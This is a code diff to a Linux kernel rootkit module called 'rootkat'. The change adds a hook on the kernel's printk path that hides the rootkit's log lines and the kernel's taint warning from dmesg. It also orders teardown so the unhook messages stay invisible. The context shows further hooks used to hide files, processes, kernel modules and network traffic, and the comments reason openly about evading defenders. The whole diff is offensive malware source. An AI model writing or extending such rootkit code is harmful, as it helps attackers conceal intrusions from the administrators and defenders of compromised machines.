@@ -17,6 +17,7 @@
 #include "hook_unix_diag.h"
 #include "hook_io_issue_sqe.h"
 #include "hook_netfilter.h"
+#include "hook_printk.h"
 #include "hidden_unix_paths.h"
 
 #define ROOTKAT_TAG "rootkat: "
@@ -51,6 +52,18 @@ static int __init rootkat_init(void)
 		pr_err(ROOTKAT_TAG "kallsyms init failed: %d\n", rc);
 		return rc;
 	}
+
+	/* Install the printk filter as early as possible — every rootkat
+	 * pr_info from this point onward is invisible to dmesg, including
+	 * the kernel's own "loading out-of-tree module taints kernel"
+	 * message which names us by module string. The earlier "loading"
+	 * pr_info above DOES land in the buffer; that's accepted (it's a
+	 * single line and any defender already knows we exist if they see
+	 * the insmod). Non-fatal: if vprintk_emit can't be hooked we run
+	 * with our log lines visible. */
+	rc = rootkat_hook_printk_install();
+	if (rc)
+		pr_warn(ROOTKAT_TAG "printk hook failed: %d (logs visible)\n", rc);
 
 	rc = rootkat_hook_m_show_install();
 	if (rc) {
@@ -157,6 +170,8 @@ static int __init rootkat_init(void)
 
 static void __exit rootkat_exit(void)
 {
+	/* Keep the printk filter live until last so our other hooks'
+	 * "unhooked %lx" pr_info lines stay invisible. */
 	rootkat_hook_netfilter_remove();
 	rootkat_hook_io_issue_sqe_remove();
 	rootkat_hook_unix_diag_remove();
@@ -171,6 +186,7 @@ static void __exit rootkat_exit(void)
 	rootkat_hook_filldir64_remove();
 	rootkat_hook_sys_kill_remove();
 	rootkat_hook_m_show_remove();
+	rootkat_hook_printk_remove();
 	pr_info(ROOTKAT_TAG "unloaded\n");
 }
 
